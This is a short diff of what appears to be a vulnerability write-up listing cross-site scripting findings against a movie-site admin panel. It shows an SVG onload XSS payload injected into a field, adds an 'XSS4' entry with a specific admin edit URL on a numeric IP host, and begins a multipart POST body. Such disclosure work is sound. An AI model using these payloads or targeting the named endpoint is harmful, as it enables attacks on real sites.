@@ -60,6 +60,10 @@ sivakarthikeyan'"><svg/onload=prompt(/sxss3/)><'"
 
 ##### XSS4
 
+```
+http://198.38.86.159/~dineshkumarwork/demo/movie/admin/movieedit.php?movieid=134
+```
+
 POST para:
 ```
 ------WebKitFormBoundarybSFVeH6LrfH6zOSG
